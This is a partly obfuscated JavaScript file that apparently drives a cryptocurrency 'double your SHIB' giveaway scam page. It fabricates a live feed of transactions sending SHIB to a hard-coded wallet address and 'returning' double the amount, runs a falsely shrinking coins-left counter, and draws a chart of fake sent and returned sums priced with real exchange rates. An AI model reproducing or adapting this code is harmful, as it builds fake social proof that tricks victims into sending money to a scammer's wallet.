function randomString(_0xe480x2) {
	var _0xe480x3 = ''
	var _0xe480x4 = 'abcdefghijklmnopqrstuvwxyz0123456789'
	var _0xe480x5 = _0xe480x4['length']
	for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
		_0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
	}
	return _0xe480x3
}

function randomStringnumber(_0xe480x2) {
	var _0xe480x3 = ''
	var _0xe480x4 = '123456789'
	var _0xe480x5 = _0xe480x4['length']
	for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
		_0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
	}
	return _0xe480x3
}

function randomStringHashBTC(_0xe480x2) {
	var _0xe480x3 = ''
	var _0xe480x4 = 'bacfed0123456789'
	var _0xe480x5 = _0xe480x4['length']
	for (var _0xe480x6 = 0; _0xe480x6 < _0xe480x2; _0xe480x6++) {
		_0xe480x3 += _0xe480x4['charAt'](Math['floor'](Math['random']() * _0xe480x5))
	}
	return _0xe480x3
}

var divCounter = 0

function randomInteger(min, max) {
	let rand = min + Math.random() * (max - min)
	return Math.round(rand)
}

function randomIntegerBTC(min, max) {
	let rand = min + Math.random() * (max - min)
	return rand.toFixed(2)
}

function getRundomMnogitel() {
	let asd = [1, 0.1, 0.01]
	let getRandom = Math.floor(Math.random() * asd.length)
	return asd[getRandom]
}
var arrSend = [800000000]
var arrGet = [1600000000]

function updateValues(coins) {
	let coinsleft = document.getElementById('coinsLeft')

	coinsleft.innerHTML = coins
}
var coinsTotal = 1000000000000
const numberFormat = Intl.NumberFormat('en-US', {})

function setValues() {
	window.onload = function () {
		let coinsTotal = 1000000000000
		coinstotal = document.getElementById('coinsTotal')
		coinstotal.innerHTML = numberFormat.format(coinsTotal)
		var coinsLeft = (coinsTotal / 2.17)['toFixed'](0)
		let coinsleft = document.getElementById('coinsLeft')
		coinsleft.innerHTML = numberFormat.format(coinsLeft)
	}
}

var coinsLeft = (coinsTotal / 2.17)['toFixed'](0)

function genDiv() {
	divCounter++

	let valet = '0x0F89eC30EAe04e5E07122D49Ab88437969E44E29'
	var _0xe480x9 = `${'<div class="item"> <div class="top"> <div class="data"> <div class="data-item spase-bottom">{t1}</div><div class="data-item spase-bottom">{t2}</div><div class="data-item spase-bottom" id="btcstr">{t4}</div><div class="data-item space-t space-status">OUT</div><div class="data-item spase-bottom">{t6}</div><div class="data-item spase-bottom">{t3}</div><div class="data-item outline-value spase-bottom">{t7}</div><div class="data-item spase-bottom">{t8}</div></div></div><div class="bottom"> <div class="data"> <div class="data-item spase-top">{b1}</div><div class="data-item spase-top">{b2}</div><div class="data-item spase-top" id="btcstr">{b4}</div><div class="data-item space-t">IN</div><div class="data-item spase-top">{b6}</div><div class="data-item spase-top">{b3}</div><div class="data-item spase-top">{b7}</div><div class="data-item spase-top">{b8}</div></div></div></div>'}`
	let _0xe480xa = '0x' + randomStringHashBTC(10) + '...'
	let _0xe480xb = '1339' + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9)
	let _0xe480xc = 'right now'
	let _0xe480xd = '0x' + randomStringnumber(1) + randomString(5) + '...'
	let _0xe480xe = ''
	let _0xe480xf = valet.substring(0, 10)
	let valueSend = Math.floor(Math.random() * 10000000000) + 100000000
	coinsLeft = coinsLeft - valueSend * 2
	console.log(coinsLeft)
	updateValues(coinsLeft)
	arrSend.push(valueSend)
	arrGet.push(valueSend * 2)
	let _0xe480x10 = valueSend + ' SHIB'
	let _0xe480x11 = (Math['random']() * 0.09 * getRundomMnogitel() +
		0.00001 * getRundomMnogitel())['toFixed'](6)
	let _0xe480x12 = '0x' + randomStringHashBTC(10) + '...'
	let _0xe480x13 = '1339' + randomInteger(1, 9) + randomInteger(1, 9) + randomInteger(1, 9)
	let _0xe480x14 = 'right now'
	let _0xe480x15 = _0xe480xf.slice(0, 10) + '...'
	let _0xe480x16 = ''
	let _0xe480x17 = _0xe480xd
	let _0xe480x18 = valueSend * 2 + ' SHIB'
	let _0xe480x19 = (Math['random']() * 0.09 * getRundomMnogitel() +
		0.00001 * getRundomMnogitel())['toFixed'](6)
	_0xe480x9 = _0xe480x9['replace']('{t1}', _0xe480x12)
	_0xe480x9 = _0xe480x9['replace']('{t2}', _0xe480x13)
	_0xe480x9 = _0xe480x9['replace']('{t3}', _0xe480x14)
	_0xe480x9 = _0xe480x9['replace']('{t4}', _0xe480x15)
	_0xe480x9 = _0xe480x9['replace']('{t5}', _0xe480x16)
	_0xe480x9 = _0xe480x9['replace']('{t6}', _0xe480x17)
	_0xe480x9 = _0xe480x9['replace']('{t7}', _0xe480x18)
	_0xe480x9 = _0xe480x9['replace']('{t8}', _0xe480x19)
	_0xe480x9 = _0xe480x9['replace']('{b1}', _0xe480xa)
	_0xe480x9 = _0xe480x9['replace']('{b2}', _0xe480xb)
	_0xe480x9 = _0xe480x9['replace']('{b3}', _0xe480xc)
	_0xe480x9 = _0xe480x9['replace']('{b4}', _0xe480xd)
	_0xe480x9 = _0xe480x9['replace']('{b5}', _0xe480xe)
	_0xe480x9 = _0xe480x9['replace']('{b6}', _0xe480x15)
	_0xe480x9 = _0xe480x9['replace']('{b7}', _0xe480x10)
	_0xe480x9 = _0xe480x9['replace']('{b8}', _0xe480x11)
	var _0xe480x1a = $(_0xe480x9)['prependTo']('.table-body')
	$('.item')['each'](function () {
		var _0xe480x6 = $(this)['index']()
		if (_0xe480x6 > 0) {
			$(this)
				['find']('.top .data div')
				['eq'](5)
				['html'](_0xe480x6 + ' min')
			$(this)
				['find']('.bottom .data div')
				['eq'](5)
				['html'](_0xe480x6 + ' min')
		}
	})
	setTimeout(function () {
		_0xe480x1a['find']('.top')['fadeIn']()
		_0xe480x1a['find']('.bottom .data div')['eq'](5)['html']('right now')
	}, 2000)
	document.getElementById('myChart').innerHTML =
		'<canvas id="myChart" width="auto" height="400"></canvas>'
}

var curCrypto = 'shiba-inu'

function getData() {
	url = `https://api.coingecko.com/api/v3/simple/price?ids=${curCrypto}&vs_currencies=usd`
	return axios.get(url).then((resp) => {
		return resp.data
	})
}
var chartCounter = 0

function genGraph() {
	chartCounter++
	getData().then((data) => {
		if (window.myChart instanceof Chart) {
			window.myChart.destroy()
		}
		if (arrGet.length > 5) {
			arrGet.shift()
			arrSend.shift()
		}
		var ctx = document.getElementById('myChart').getContext('2d')
		let DATA_COUNT

		const labels = []
		if (chartCounter < 5) {
			DATA_COUNT = arrSend.length
			for (let i = 1; i <= DATA_COUNT; ++i) {
				labels.push(i.toString())
			}
		}

		if (chartCounter == 5) {
			DATA_COUNT = arrSend.length
			for (let i = 2; i < 7; ++i) {
				labels.push(i.toString())
			}
		}
		if (chartCounter >= 6) {
			DATA_COUNT = arrSend.length
			for (let i = chartCounter - 4; i <= chartCounter; ++i) {
				labels.push(i.toString())
			}
		}

		window.myChart = new Chart(ctx, {
			type: 'line',
			borderWidth: 0,
			data: {
				labels: labels,
				datasets: [
					{
						label: 'SHIB SENT',
						data: arrSend,
						borderColor: 'rgb(136, 136, 136)',
						fill: true,
						backgroundColor: 'rgba(136, 136, 136, 0.3)',
						cubicInterpolationMode: 'monotone',
						tension: 0.4,
					},
					{
						label: 'SHIB RETURNED',
						data: arrGet,
						borderColor: 'rgb(255, 122, 56)',
						backgroundColor: 'rgba(255, 122, 56, 0.3)',
						fill: true,
						cubicInterpolationMode: 'monotone',
						tension: 0.4,
					},
				],
			},

			options: {
				responsive: false,

				plugins: {
					legend: {
						labels: {
							usePointStyle: true,
							color: '#888',
							backdropPadding: '150',
						},
						color: '#888',
					},
					tooltip: {
						callbacks: {
							title: () => null, // or function () { return null; }
						},
						backgroundColor: 'rgb(255, 122, 56)',
					},
				},

				scales: {
					x: {
						grid: {
							display: false,
						},
						ticks: {
							display: false,
						},
						callback: function (value, index, values) {
							return chartCounter
						},
					},

					y: {
						ticks: {
							color: '#888',
							maxTicksLimit: 7,
							callback: function (value, index, values) {
								console.log(curCrypto)
								console.log(data[curCrypto]['usd'])
								let sum = value * data[curCrypto]['usd']
								return '$' + sum.toFixed(2)
							},
						},

						grid: {
							display: false,
						},
					},
				},
			},
		})
	})
}
$(document)['ready'](function () {
	genDiv()
	setValues()
	genGraph()
	setInterval(function () {
		genDiv()
		genGraph()
		console.log(arrGet)
	}, 15500)
})
$('.copy-adress').click(function () {
	$('.adress-copy').fadeIn()
	setTimeout(hidealert, 2000)
})
